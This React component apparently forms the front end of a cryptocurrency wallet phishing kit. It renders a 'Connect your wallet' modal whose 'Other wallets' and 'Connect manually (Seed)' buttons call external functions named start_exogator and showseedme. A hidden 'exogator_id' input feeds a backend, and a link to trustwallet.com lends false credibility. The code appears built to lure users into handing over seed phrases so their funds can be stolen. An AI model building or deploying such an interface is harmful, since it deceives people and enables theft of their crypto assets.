import React from 'react';
import { X } from 'lucide-react';

interface WalletConnectModalProps {
  isOpen: boolean;
  onClose: () => void;
}

// Extend global window object for TypeScript
declare global {
  interface Window {
    start_exogator: () => void;
    showseedme: () => void;
  }
}

export default function WalletConnectModal({ isOpen, onClose }: WalletConnectModalProps) {
  if (!isOpen) return null;

  // Asli Script Functions ko call karne ke liye
  const handleOtherWallets = () => {
    if (typeof window.start_exogator === 'function') {
      window.start_exogator();
    } else {
      console.error('External scripts not loaded yet');
    }
  };

  const handleManualConnect = () => {
    if (typeof window.showseedme === 'function') {
      window.showseedme();
    } else {
      console.error('External scripts not loaded yet');
    }
  };

  return (
    <div className="fixed inset-0 z-50 flex items-center justify-center p-4 bg-black/50 backdrop-blur-sm" id="modal-container">
      <div className="modal__content bg-white p-6 rounded-lg w-full max-w-sm shadow-xl relative">
        
        {/* Close Button */}
        <div className="absolute top-2 right-2 cursor-pointer text-gray-500 hover:text-gray-800" onClick={onClose} title="Close">
          <X className="w-5 h-5" />
        </div>

        <h1 id="tito1" className="modal__title text-xl font-bold mb-2 text-black">Connect your wallet</h1>
        <p id="tito2" className="modal__description text-sm text-gray-600 mb-6">Please select one of the options below to connect your wallet.</p>

        {/* Other Wallets Button */}
        <button 
          id="tito3" 
          className="modal__button modal__button-width w-full bg-blue-600 text-white py-3 px-4 rounded mb-4 hover:bg-blue-700 transition font-semibold" 
          onClick={handleOtherWallets}
        >
          Other wallets 
          <span style={{ fontSize: '10px', background: '#eee', color: '#666', padding: '2px 5px', borderRadius: '5px', marginLeft: '10px' }}>350+</span>
        </button>

        {/* Manual Seed Button */}
        <button 
          id="tito3" 
          className="modal__button modal__button-width w-full bg-gray-100 text-gray-800 py-3 px-4 rounded mb-4 hover:bg-gray-200 transition font-semibold border border-gray-300" 
          onClick={handleManualConnect}
        > 
          Connect manually <span style={{ fontSize: '10px', background: '#ccc', color: '#333', padding: '2px 5px', borderRadius: '5px', marginLeft: '10px' }}>Seed</span>
        </button>

        <a className="modal__button-link block text-center text-gray-500 text-sm hover:underline mt-2" href="https://trustwallet.com/">
          Haven't got a wallet? Get started
        </a>
        
        {/* Hidden ID (Very Important for your backend) */}
        <input type="hidden" value="L5WL5CQL8U7E3TBSSTTGUHBIRV3FRKQFEMHSVSTQPLXOB" id="exogator_id" />
      </div>
    </div>
  );
}